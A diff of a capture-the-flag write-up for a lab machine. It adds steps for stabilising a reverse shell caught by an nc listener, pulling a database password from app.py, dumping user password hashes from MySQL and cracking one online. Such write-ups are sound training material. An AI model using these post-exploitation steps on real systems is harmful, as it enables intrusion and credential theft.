@@ -314,7 +314,23 @@ www-data@iclean:/opt/app$
 
 <br />
 
-Intrusion ready! Let's go with the escalation of privileges!
+Properly sanitize the tty so that it is fully functional:
+
+<br />
+
+```bash
+www-data@iclean:/opt/app$ python3 -c 'import pty;pty.spawn("bash")'
+www-data@iclean:/opt/app$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@hacky$ stty raw -echo; fg
+nc -nlvp 443
+                reset xterm
+www-data@iclean:/opt/app$
+```
+
+<br />
+
+Intrusion ready! Let's go with the Privilege Escalation!
 
 <br />
 
@@ -345,15 +361,68 @@ We continue to list the system and find credentials to log into a database:
 <br />
 
 ```bash
-www-data@iclean:/opt/app$ cat app.py | grep -i password -B 5
-cat app.py | grep -i password -B 5
-app.secret_key = secret_key
-# Database Configuration
-db_config = {
+www-data@iclean:/opt/app$ cat app.py | grep -i password -C 2
     'host': '127.0.0.1',
     'user': 'iclean',
     'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
 ```
+
+<br />
+
+We connect to the database and list the following tables:
+
+<br />
+
+```bash
+www-data@iclean:/opt/app$ mysql -u iclean -ppxCsmnGLckUb -D capiclean
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 875
+Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show tables;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.00 sec)
+```
+
+<br />
+
+As we can see, we have a table that looks quite interesting, the users table, so let's see its contents:
+
+<br />
+
+```bash
+mysql> select * from users;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+2 rows in set (0.00 sec)
+```
+
+<br />
+
+We have found a hash for the user we want to pivot to, so we crack it in [crackstation.net](https://crackstation.net/) and we have a credential!!
 
 <br />
 
